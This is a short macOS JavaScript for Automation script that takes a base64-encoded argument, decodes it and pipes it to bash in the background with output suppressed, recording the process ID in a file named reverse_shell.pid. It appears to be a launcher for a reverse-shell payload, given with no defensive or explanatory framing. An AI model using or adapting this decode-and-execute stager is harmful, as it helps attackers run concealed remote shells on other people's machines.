ObjC.import('stdlib');

function run(argv) {
    var app = Application.currentApplication();
    app.includeStandardAdditions = true;

    var encoded = argv[0].replace(/\s+/g, "");
    console.log("Encoded: " + encoded);

    var cmd = 'sh -c "echo ' + encoded + ' | base64 -D | bash" > /dev/null 2>&1 & echo $! > /tmp/reverse_shell.pid';
    console.log("Cmd: " + cmd);
    var pid = app.doShellScript(cmd);

    delay(3);
}
